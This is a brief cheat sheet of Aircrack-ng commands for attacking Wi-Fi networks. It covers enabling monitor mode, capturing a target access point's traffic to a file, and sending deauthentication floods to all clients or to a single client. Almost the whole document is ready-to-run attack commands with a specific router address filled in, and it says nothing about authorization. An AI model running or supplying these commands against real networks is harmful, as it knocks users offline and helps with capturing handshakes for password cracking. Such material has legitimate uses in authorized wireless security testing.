Aircrack Cheat Sheet
====================

### start monitor

    airmon-ng start wlp1s0

### dump all

    airodump-ng wlp1s0mon

### dump specific to file

    airodump-ng -c 1 --bssid 84:9C:A6:28:62:DA -w HAIR_wpa wlp1s0mon --ignore-negative-one

    -c channel
    --bssid router
    -w filename
    --ignore-negative-one Removes 'fixed channel : -1' message

### deauth broadcast

    aireplay-ng --deauth 100 -a 84:9C:A6:28:62:DA wlp1s0mon --ignore-negative-one

### specific deauth

    aireplay-ng --deauth 100 -a 84:9C:A6:28:62:DA -c AA:BB:CC:DD:EE:FF wlp1s0mon --ignore-negative-one

